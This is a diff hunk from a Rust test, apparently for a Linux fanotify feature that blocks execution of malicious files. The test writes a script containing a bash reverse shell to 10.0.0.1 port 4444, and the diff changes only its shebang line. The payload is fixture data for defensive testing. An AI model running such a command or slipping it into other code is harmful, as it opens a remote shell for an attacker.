@@ -300,7 +300,7 @@ fn test_privileged_linux_fanotify_execution_blocking() {
         let malicious_script = test_dir.join("malicious.sh");
         std::fs::write(
             &malicious_script,
-            "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+            "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
         )
         .unwrap();
         #[cfg(unix)]
